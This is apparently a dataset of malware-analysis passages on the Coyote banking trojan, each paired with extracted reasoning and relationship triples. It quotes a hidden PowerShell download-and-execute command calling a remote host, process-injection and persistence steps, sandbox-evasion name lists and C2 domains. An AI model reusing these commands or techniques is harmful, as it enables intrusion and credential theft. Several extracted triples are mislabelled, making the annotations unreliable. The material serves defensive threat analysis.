[
    {
        "phase": "initial access",
        "content": "The LNK file executes the following PowerShell command, which connects to a remote server to initiate the next stage: -w hid -noni -ep Bypass -c \"Start-Job -Name PSSGR -ScriptBlock { IEX (iwr -Uri 'hxxps://tbet[.]geontrigame[.]com/zxchzzmism' -UseBasicParsing).Content }; Start-Sleep 131.\"\nWe analyzed multiple malicious files by examining the \"Machine ID\" embedded within the LNK files. This unique identifier provides critical insights into the system where the LNK file originated. By extracting and analyzing this metadata, we traced connections to other malicious LNK files associated with Coyote.\nThe content in \"zxchzzmism\" is an additional PowerShell script that holds two encoded data segments. This script employs specific commands to decode and execute the embedded shellcode, initiating the next phase of the malicious operation.",
        "relationship": "1. [CoT]: The text states that the LNK file executes a PowerShell command which connects to a remote server (hxxps://tbet[.]geontrigame[.]com/zxchzzmism) to initiate the next stage.   [Relationships]: <process:LNK file,executes,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n2. [CoT]: The PowerShell command executes a script block that includes the URL (iwr -Uri 'hxxps://tbet[.]geontrigame[.]com/zxchzzmism' -UseBasicParsing).Content.   [Relationships]: <process:PowerShell,connects to,socket:hxxps://tbet[.]geontrigame[.]com/zxchzzmism>. \n3. [CoT]: The PowerShell script decodes and executes embedded shellcode as part of the next phase of the malicious operation.   [Relationships]: <process:PowerShell,executes,socket:additional PowerShell script>. "
    },
    {
        "phase": "execution",
        "content": "The \"bmwiMcDec\" DLL file functions as a loader, utilizing VirtualAllocEx and WriteProcessMemory to inject the \"npuGDec\" payload. It then employs CreateRemoteThread to execute the injected malicious code, facilitating the continuation of the attack.\nThe injected code leverages Donut, a tool designed to decrypt and execute the final MSIL (Microsoft Intermediate Language) payloads. This ensures seamless delivery and execution of the attack's next stage.\nThe decrypted MSIL execution file first establishes persistence by modifying the registry at \"HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\" It checks for any existing PowerShell command in this registry entry. If found, it removes the existing entry and creates a new one with a randomly generated name. This new registry entry contains a customized PowerShell command pointing to download and execute a Base64-encoded URL, which facilitates the main functions of the Coyote Banking Trojan. The targeted URL for this operation is \"hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw.\"\nIf the victim is the new target, it gathers basic system information, such as the machine name, username, and operating system, and sends it to a remote server. It also identifies installed antivirus products by querying the SecurityCenter2 namespace in Windows Management Instrumentation (WMI). The collected data is then concatenated with a \"|\" separator, encoded in Base64, and the resulting string is reversed. This processed string is appended as a parameter and sent back to the remote server as follows: \"hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit).\"\nAfter setting and checking in, it calls \"CreateProcess\" to execute the PowerShell command that was added into the registry to invoke the payload:",
        "relationship": "1. [CoT]: The text states that \"bmwiMcDec\" DLL file uses \"VirtualAllocEx\" to allocate memory in the target process.   [Relationships]: <process:bmwiMcDec,DLL,file:VirtualAllocEx,process,>. \n2. [CoT]: The text states that \"bmwiMcDec\" DLL file uses \"WriteProcessMemory\" to write the \"npuGDec\" payload into the allocated memory.   [Relationships]: <process:bmwiMcDec,DLL,file:WriteProcessMemory,process,>. \n3. [CoT]: The text states that \"bmwiMcDec\" DLL file uses \"CreateRemoteThread\" to execute the injected malicious code.   [Relationships]: <process:bmwiMcDec,DLL,file:CreateRemoteThread,process,>. \n4. [CoT]: The text states that the injected code leverages \"Donut\" to decrypt and execute the final MSIL payloads.   [Relationships]: <process:injected code,tool:Donut,process,>. \n5. [CoT]: The text states that the decrypted MSIL execution file modifies the registry at \"HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\"   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg,>. \n6. [CoT]: The text states that the decrypted MSIL execution file checks for any existing PowerShell command in the registry entry.   [Relationships]: <process:decrypted MSIL execution file,file:PowerShell command,reg,>. \n7. [CoT]: The text states that the decrypted MSIL execution file removes the existing registry entry if a PowerShell command is found.   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg,>. \n8. [CoT]: The text states that the decrypted MSIL execution file creates a new registry entry with a randomly generated name.   [Relationships]: <process:decrypted MSIL execution file,file:HCKU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,reg,>. \n9. [CoT]: The text states that the new registry entry contains a customized PowerShell command.   [Relationships]: <process:decrypted MSIL execution file,file:PowerShell command,reg,>. \n10. [CoT]: The text states that the PowerShell command is designed to download and execute a Base64-encoded URL.   [Relationships]: <process:PowerShell,process:hxxps://yezh[.]geontrigame[.]com/vxewhcacbfqnsw,socket,>. \n11. [CoT]: The text states that the victim gathers system information, such as the machine name, username, and operating system.   [Relationships]: <process:victim,file:machine name,file,>. \n12. [CoT]: The text states that the victim gathers system information, such as the machine name, username, and operating system.   [Relationships]: <process:victim,file:username,file,>. \n13. [CoT]: The text states that the victim gathers system information, such as the machine name, username, and operating system.   [Relationships]: <process:victim,file:operating system,file,>. \n14. [CoT]: The text states that the victim sends the collected data to a remote server.   [Relationships]: <process:victim,process:hxxps://yezh[.]geontrigame[.]com/hqizjs/?l=y4CMuADfvJHUgATMgM3dvRmbpdFI0Z2bz9mcjlWT8JXZk5WZmVGRgM3dvRmbpdFfzlmcoNEf0IDR0Ul(omit),socket,>. \n15. [CoT]: The text states that the victim identifies installed antivirus products by querying the SecurityCenter2 namespace in WMI.   [Relationships]: <process:victim,process:SecurityCenter2,reg,>. \n16. [CoT]: The text states that the collected data is encoded in Base64 and reversed before being appended as a parameter.   [Relationships]: <process:victim,file:Base64 encoded string,file,>. \n17. [CoT]: The text states that the decrypted MSIL execution file calls \"CreateProcess\" to execute the PowerShell command.   [Relationships]: <process:decrypted MSIL execution file,process:CreateProcess,process,>. "
    },
    {
        "phase": "command and control",
        "content": "The payload \"vxewhcacbfqnsw\" is similar to the one downloaded from the LNK file but is noticeably larger. This increase in size is due to the inclusion of the main Coyote Baking Trojan.\nWe obtained the MSIL file after decrypting the payload from the Donut shellcode. It contained the following functions:\nUsername Checking: It examines the username to see if any of the following test/sandbox names are present: Johnson, Miller, malware, maltest, CurrentUser, Sandbox, virus, John Doe, test user, sand box, WDAGUtilityAccount, Bruno, George, and Harry Johnson. \nVirtual Management Tool Checking: It examines whether the environment contains files or folders related to virtual machines. It checks for strings in the directory \"C:\\Windows\\System32\" such as qemu-ga, qemuwmi, balloon.sys, netkvm.sys, vioinput, viofs.sys, and vioser.sys. \nBuild Targeting List: In this version, Coyote expands its target list to include 1,030 sites and 73 financial agents, including mercadobitcoin.com.br, bitcointrade.com.br, foxbit.com.br, augustoshotel.com.br, blumenhotelboutique.com.br, and fallshotel.com.br. It then starts monitoring the active window.\nCommunicate with C2: Coyote continuously monitors the active window to detect if the victim attempts to access any target sites. If a target site is accessed, it contacts the C2 server via port 443. The server list includes geraatualiza[.]com, masterdow[.]com, and geraupdate[.]com. Coyote reads a message from a remote server, processes it by decoding and cleaning the data, and prepares it for further actions based on the length of the first string in the message.",
        "relationship": "1. [CoT]: The text states that the payload \"vxewhcacbfqnsw\" was downloaded from a LNK file, indicating a process-to-file relationship where the LNK file performed the action of downloading the payload.   [Relationships]: <process:LNK,file:vxewhcacbfqnsw/download>. \n2. [CoT]: The text mentions that the MSIL file was obtained after decrypting the payload from the Donut shellcode, showing a process-to-file relationship where the Donut shellcode performed the action of decrypting the payload.   [Relationships]: <process:Donut shellcode,file:payload/decrypt>. \n3. [CoT]: The MSIL file contained a function that examines the username for specific test or sandbox names, indicating a process-to-process relationship where the MSIL file performed the action of examining the Username.   [Relationships]: <process:MSIL file,process:Username/examine>. \n4. [CoT]: The MSIL file checked for strings in the directory \"C:\\Windows\\System32\", showing a process-to-file relationship where the MSIL file performed the action of checking for strings in the directory.   [Relationships]: <process:MSIL file,file:C:\\Windows\\System32/check>. \n5. [CoT]: Coyote expands its target list to include 1,030 sites, indicating a process-to-file relationship where the MSIL file (later renamed to Coyote) performed the action of expanding its target list.   [Relationships]: <process:Coyote,file:1030 sites/expand>. \n6. [CoT]: Coyote expands its target list to include 73 financial agents, showing a process-to-file relationship where the MSIL file (renamed to Coyote) performed the action of expanding its target list to include financial agents.   [Relationships]: <process:Coyote,file:73 financial agents/expand>. \n7. [CoT]: Coyote monitors the active window for target site access, indicating a process-to-process relationship where the MSIL file (renamed to Coyote) performed the action of monitoring the active window.   [Relationships]: <process:Coyote,process:active window/monitor>. \n8. [CoT]: If a target site is accessed, Coyote contacts the C2 server via port 443, showing a process-to-socket relationship where the MSIL file (renamed to Coyote) performed the action of contacting the C2 server.   [Relationships]: <process:Coyote,socket:port 443/contact>. \n9. [CoT]: Coyote reads a message from a remote server, indicating a process-to-socket relationship where the MSIL file (renamed to Coyote) performed the action of reading from the remote server.   [Relationships]: <process:Coyote,socket:remote server/read>. \n10. [CoT]: Coyote prepares the message for further actions, showing a process-to-file relationship where the MSIL file (renamed to Coyote) performed the action of preparing the message.   [Relationships]: <process:Coyote,file:message/prepare>. "
    }
]